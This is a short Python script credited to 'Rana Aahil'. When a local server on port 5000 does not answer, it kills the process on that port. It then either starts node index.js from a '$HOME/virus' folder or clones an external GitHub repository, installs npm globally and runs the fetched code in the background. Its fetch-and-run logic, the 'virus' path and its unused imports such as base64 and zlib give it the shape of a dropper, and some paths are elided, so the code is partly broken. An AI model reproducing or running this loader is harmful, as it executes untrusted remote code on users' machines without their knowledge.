#coding: utf-8
#orignal coding : Rana Aahil

import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64, re, zlib
from datetime import datetime, timedelta
from dateutil.relativedelta import *
from concurrent.futures import ThreadPoolExecutor as tpe
from requests.exceptions import ConnectionError
import os.path


try:
    x=requests.get("http://localhost:5000/")
except(ConnectionError):
    if os.path.isfile("/..../index.js"):
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd $HOME/virus/..... && node index.js &')
        print("Level One chek localhost")
        time.sleep(22222)
    else:
        os.system("git clone https://github.com/ranaaahilsystems/.....")
        os.system('npm install -g npm@6 ')
        os.system('npm audit fix')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node index.js &')
        print("level two chek")
        time.sleep(11111)
